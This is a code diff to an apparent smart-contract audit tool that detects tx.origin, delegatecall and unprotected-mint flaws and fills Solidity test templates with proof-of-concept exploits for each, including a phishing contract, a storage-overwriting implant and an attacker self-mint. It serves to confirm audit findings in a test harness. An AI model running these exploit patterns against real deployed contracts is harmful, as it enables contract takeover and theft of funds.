@@ -370,6 +370,68 @@ def _find_selfdestruct_fn(source: str) -> tuple[str, str] | None:
     return None
 
 
+def _balance_accessor(source: str) -> str | None:
+    for name in ("balanceOf", "balances"):
+        if re.search(r"mapping\s*\(\s*address\s*=>\s*uint(?:256)?\s*\)\s*public\s+" + name + r"\b", source):
+            return name
+    return None
+
+
+def _find_tx_origin_owner_setter(source: str) -> tuple[str, bool] | None:
+    """A function guarded by tx.origin that reassigns owner — the classic phishing
+    sink. Returns (function_name, takes_address_arg)."""
+    for name, params, body, _between in _iter_functions(source):
+        if "tx.origin" not in body or not re.search(r"\b_?owner\s*=", body):
+            continue
+        ptype = _first_param_type(params)
+        if ptype and ptype.startswith("address") and "," not in params:
+            return name, True
+        if params == "":
+            return name, False
+    return None
+
+
+def _find_delegatecall_fn(source: str) -> str | None:
+    """A function that delegatecalls into an attacker-supplied (address, bytes)."""
+    for name, params, body, _between in _iter_functions(source):
+        if "delegatecall" not in body:
+            continue
+        types = [piece.strip().split()[0] for piece in params.split(",") if piece.strip()]
+        if len(types) >= 2 and types[0].startswith("address") and types[1].startswith("bytes"):
+            return name
+    return None
+
+
+_MINT_ARG_VALUES = {"address": "attacker", "uint": "1000 ether", "bool": "true"}
+
+
+def _find_unprotected_mint(source: str) -> tuple[str, list[str], str] | None:
+    """A mint-like function that credits a public balance mapping. Returns
+    (function_name, concrete_call_args, balance_accessor)."""
+    accessor = _balance_accessor(source)
+    if accessor is None:
+        return None
+    for name, params, body, _between in _iter_functions(source):
+        if "mint" not in name.lower() or accessor not in body:
+            continue
+        types = [piece.strip().split()[0] for piece in params.split(",") if piece.strip()]
+        args: list[str] = []
+        ok = True
+        for type_name in types:
+            if type_name.startswith("address"):
+                args.append(_MINT_ARG_VALUES["address"])
+            elif type_name.startswith("uint"):
+                args.append(_MINT_ARG_VALUES["uint"])
+            elif type_name.startswith("bool"):
+                args.append(_MINT_ARG_VALUES["bool"])
+            else:
+                ok = False
+                break
+        if ok:
+            return name, args, accessor
+    return None
+
+
 # --------------------------------------------------------------------------- #
 # Exploit strategy selection
 # --------------------------------------------------------------------------- #
@@ -377,6 +439,9 @@ def _find_selfdestruct_fn(source: str) -> tuple[str, str] | None:
 _REENTRANCY_HINTS = ("reentr", "reentrancy")
 _OWNERSHIP_HINTS = ("access", "ownership", "unprotected", "authoriz", "privileg", "takeover")
 _SELFDESTRUCT_HINTS = ("selfdestruct", "suicidal", "self-destruct", "self destruct")
+_TX_ORIGIN_HINTS = ("tx.origin", "tx origin", "txorigin", "phish")
+_DELEGATECALL_HINTS = ("delegatecall", "delegate call", "delegate-call")
+_MINT_HINTS = ("mint", "inflation", "infinite supply", "unlimited supply", "token supply")
 
 
 @dataclass(frozen=True)
@@ -401,13 +466,24 @@ def pick_exploit(
         return None
     nospace = source.lower().replace(" ", "")
     has_dw = "functiondeposit" in nospace and "functionwithdraw" in nospace and "call{value" in nospace
-    owner_setter = _find_owner_setter(source) if _has_owner_getter(source) else None
+    has_owner = _has_owner_getter(source)
+    owner_setter = _find_owner_setter(source) if has_owner else None
+    tx_origin_setter = _find_tx_origin_owner_setter(source) if has_owner else None
+    delegatecall_fn = _find_delegatecall_fn(source) if has_owner else None
+    mint_fn = _find_unprotected_mint(source)
     selfdestruct_fn = _find_selfdestruct_fn(source)
 
     for finding in candidates:
         hay = f"{finding.summary} {finding.taxonomy.wr3_category} {finding.description}".lower()
         if has_dw and any(hint in hay for hint in _REENTRANCY_HINTS):
             return PickedExploit("reentrancy", finding)
+        # tx.origin phishing is more specific than generic access-control; check first.
+        if tx_origin_setter and any(hint in hay for hint in _TX_ORIGIN_HINTS):
+            return PickedExploit("tx_origin", finding, tx_origin_setter)
+        if delegatecall_fn and any(hint in hay for hint in _DELEGATECALL_HINTS):
+            return PickedExploit("delegatecall", finding, delegatecall_fn)
+        if mint_fn and any(hint in hay for hint in _MINT_HINTS):
+            return PickedExploit("erc20_mint", finding, mint_fn)
         if owner_setter and any(hint in hay for hint in _OWNERSHIP_HINTS):
             return PickedExploit("ownership_takeover", finding, owner_setter)
         # selfdestruct relies on same-tx code deletion (EIP-6780): source mode only.
@@ -433,6 +509,7 @@ def pick_exploit_candidate(
 _VM_INTERFACE = """interface IWr3Vm {
     function deal(address who, uint256 newBalance) external;
     function prank(address sender) external;
+    function prank(address sender, address origin) external;
     function createSelectFork(string calldata urlOrAlias) external returns (uint256);
     function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
 }"""
@@ -466,6 +543,12 @@ def build_foundry_test(
             return build_reentrancy_exploit(target_name, exploit.finding, fork)
         if exploit.key == "ownership_takeover":
             return build_ownership_takeover_exploit(target_name, exploit.finding, exploit.detail, fork)
+        if exploit.key == "tx_origin":
+            return build_tx_origin_exploit(target_name, exploit.finding, exploit.detail, fork)
+        if exploit.key == "delegatecall":
+            return build_delegatecall_exploit(target_name, exploit.finding, exploit.detail, fork)
+        if exploit.key == "erc20_mint":
+            return build_unprotected_mint_exploit(target_name, exploit.finding, exploit.detail, fork)
         if exploit.key == "selfdestruct":
             return build_selfdestruct_exploit(target_name, exploit.finding, exploit.detail)
     finding = candidates[0] if candidates else None
@@ -596,6 +679,175 @@ def build_ownership_takeover_exploit(
         .replace("__ACQUIRE__", _acquire_target(target_name, fork))
         .replace("__SETTER_ARG__", "attacker" if takes_addr else "")
         .replace("__SETTER__", name)
+        .replace("__MODE__", "fork" if fork else "source")
+        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
+        .replace("__TARGET__", target_name)
+    )
+
+
+_TX_ORIGIN_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+// wr3 tx.origin-phishing PoC (__MODE__ mode)
+// finding: __SUMMARY__
+import "../src/Target.sol";
+
+__VM_INTERFACE__
+
+contract Wr3Phisher {
+    __TARGET__ private target;
+
+    constructor(__TARGET__ _target) {
+        target = _target;
+    }
+
+    function pwn(address newOwner) external {
+        target.__SETTER__(__SETTER_ARG__);
+    }
+}
+
+contract Wr3PoCTest {
+    __VM_DECL__
+
+    function testWr3TxOriginPhish() public {
+        __ACQUIRE__
+        address ownerEoa = target.owner();
+        address attacker = address(uint160(0xA11CE));
+        Wr3Phisher phisher = new Wr3Phisher(target);
+
+        // The owner is socially engineered into calling the attacker's contract.
+        // msg.sender to the victim is the phisher, but tx.origin stays the owner.
+        vm.prank(ownerEoa, ownerEoa);
+        phisher.pwn(attacker);
+
+        // WR3_CONFIRMED_EXPLOIT_ASSERTION: ownership changed via a contract call
+        // that only passed because the victim authorises by tx.origin.
+        require(target.owner() == __NEW_OWNER__ && target.owner() != ownerEoa, "wr3: tx.origin phishing failed");
+    }
+}
+"""
+
+
+def build_tx_origin_exploit(
+    target_name: str,
+    finding: Finding,
+    detail: object | None,
+    fork: ForkContext | None = None,
+) -> str:
+    name, takes_addr = detail if isinstance(detail, tuple) else ("setOwner", True)
+    return (
+        _TX_ORIGIN_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
+        .replace("__VM_DECL__", _VM_DECL)
+        .replace("__ACQUIRE__", _acquire_target(target_name, fork))
+        .replace("__SETTER_ARG__", "newOwner" if takes_addr else "")
+        .replace("__SETTER__", name)
+        .replace("__NEW_OWNER__", "attacker" if takes_addr else "address(phisher)")
+        .replace("__MODE__", "fork" if fork else "source")
+        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
+        .replace("__TARGET__", target_name)
+    )
+
+
+_DELEGATECALL_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+// wr3 unprotected-delegatecall PoC (__MODE__ mode)
+// finding: __SUMMARY__
+import "../src/Target.sol";
+
+__VM_INTERFACE__
+
+contract Wr3Implant {
+    // When delegatecalled, overwrites storage slot 0 of the caller (the victim).
+    function pwn(address newOwner) external {
+        assembly {
+            sstore(0, newOwner)
+        }
+    }
+}
+
+contract Wr3PoCTest {
+    __VM_DECL__
+
+    function testWr3DelegatecallTakeover() public {
+        __ACQUIRE__
+        address attacker = address(uint160(0xA11CE));
+        Wr3Implant implant = new Wr3Implant();
+
+        vm.prank(attacker);
+        target.__DCALL__(address(implant), abi.encodeWithSignature("pwn(address)", attacker));
+
+        // WR3_CONFIRMED_EXPLOIT_ASSERTION: the unprotected delegatecall let an
+        // attacker overwrite owner (storage slot 0) and seize the contract.
+        require(target.owner() == attacker, "wr3: delegatecall takeover failed");
+    }
+}
+"""
+
+
+def build_delegatecall_exploit(
+    target_name: str,
+    finding: Finding,
+    detail: object | None,
+    fork: ForkContext | None = None,
+) -> str:
+    dcall = detail if isinstance(detail, str) else "execute"
+    return (
+        _DELEGATECALL_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
+        .replace("__VM_DECL__", _VM_DECL)
+        .replace("__ACQUIRE__", _acquire_target(target_name, fork))
+        .replace("__DCALL__", dcall)
+        .replace("__MODE__", "fork" if fork else "source")
+        .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
+        .replace("__TARGET__", target_name)
+    )
+
+
+_MINT_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+// wr3 unprotected-mint PoC (__MODE__ mode)
+// finding: __SUMMARY__
+import "../src/Target.sol";
+
+__VM_INTERFACE__
+
+contract Wr3PoCTest {
+    __VM_DECL__
+
+    function testWr3UnprotectedMint() public {
+        __ACQUIRE__
+        address attacker = address(uint160(0xA11CE));
+        uint256 beforeBal = target.__ACCESSOR__(attacker);
+
+        vm.prank(attacker);
+        target.__MINT_ARGS_CALL__;
+
+        // WR3_CONFIRMED_EXPLOIT_ASSERTION: an arbitrary attacker minted tokens to
+        // itself with no authorization.
+        require(target.__ACCESSOR__(attacker) > beforeBal, "wr3: unprotected mint failed");
+    }
+}
+"""
+
+
+def build_unprotected_mint_exploit(
+    target_name: str,
+    finding: Finding,
+    detail: object | None,
+    fork: ForkContext | None = None,
+) -> str:
+    if isinstance(detail, tuple):
+        name, args, accessor = detail
+    else:
+        name, args, accessor = "mint", ["attacker", "1000 ether"], "balanceOf"
+    call = f"{name}({', '.join(args)})"
+    return (
+        _MINT_TEMPLATE.replace("__VM_INTERFACE__", _VM_INTERFACE)
+        .replace("__VM_DECL__", _VM_DECL)
+        .replace("__ACQUIRE__", _acquire_target(target_name, fork))
+        .replace("__MINT_ARGS_CALL__", call)
+        .replace("__ACCESSOR__", accessor)
         .replace("__MODE__", "fork" if fork else "source")
         .replace("__SUMMARY__", finding.summary.replace("*/", "* /")[:200])
         .replace("__TARGET__", target_name)
